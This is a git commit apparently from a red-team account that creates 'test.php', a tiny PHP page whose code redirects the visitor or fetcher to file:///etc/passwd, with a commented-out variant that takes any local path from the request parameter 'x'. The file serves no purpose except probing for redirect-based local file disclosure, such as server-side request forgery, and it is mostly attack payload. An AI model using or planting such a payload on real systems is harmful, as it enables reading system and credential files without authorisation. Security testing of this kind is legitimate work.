12cbb94a9c95d40d5aeef049f5cbe2ad6348cfc7
Gabe Thompson <126591847+redteamronin@users.noreply.github.com>
2024-10-05 13:44:09 -0500

    Create test.php

---
+++ test.php
@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>System Command Output:</h1>h1
+<!-- <?php header('location:file://'.$_REQUEST['x']); ?> -->
+<?php
+header('location:file:///etc/passwd');
+?>
+</body>
+</html>
